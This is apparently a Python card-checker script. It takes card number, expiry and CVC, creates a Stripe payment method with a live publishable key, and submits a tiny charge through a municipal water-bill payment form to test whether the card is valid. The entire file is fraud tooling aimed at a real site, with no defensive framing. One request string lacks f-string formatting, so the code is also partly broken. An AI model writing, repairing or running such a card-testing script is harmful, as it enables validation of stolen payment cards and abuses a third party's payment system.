import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+card-element&referrer=https%3A%2F%2Fphillipsburgoh.gov&time_on_page=64733&client_attribution_metadata[client_session_id]=1dd5037b-66a7-45fa-857e-e0fb1848d1be&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51SCkbd2QFi1R5OccRFBjcVC35jII1s2C2aYbWzuJp5aQreP1hpaa3ZCwNdsANY1YQ9hzF5AUtsD15g8r1Y2nr5DN002qac1owB'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.1526505093.1770008264',
	    '__stripe_mid': 'e57217d7-7979-44d3-8dce-2b3915e7405659cdc9',
	    '__stripe_sid': '07e16c0a-c75e-459b-8be9-8306c9b1dfd0d2b8fb',
	    '_ga_3DSWE1FTZP': 'GS2.1.s1770008264$o1$g0$t1770008271$j53$l0$h0',
	}
	
	headers = {
	    'authority': 'phillipsburgoh.gov',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1526505093.1770008264; __stripe_mid=e57217d7-7979-44d3-8dce-2b3915e7405659cdc9; __stripe_sid=07e16c0a-c75e-459b-8be9-8306c9b1dfd0d2b8fb; _ga_3DSWE1FTZP=GS2.1.s1770008264$o1$g0$t1770008271$j53$l0$h0',
	    'origin': 'https://phillipsburgoh.gov',
	    'referer': 'https://phillipsburgoh.gov/water-bill/',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1770008329180',
	}
	
	data = {
	    'data': f'__fluent_form_embded_post_id=3739&_fluentform_10_fluentformnonce=a79e2619a0&_wp_http_referer=%2Fwater-bill%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&input_text=&numeric_field=&phone=&email=&custom-payment-amount=0.5&payment_method=stripe&__stripe_payment_method_id={pm}',
	    'action': 'fluentform_submit',
	    'form_id': '10',
	}
	
	response = requests.post(
	    'https://phillipsburgoh.gov/wp-admin/admin-ajax.php',
	    params=params,
	    #cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	result = response.json()['message']
	
	return result
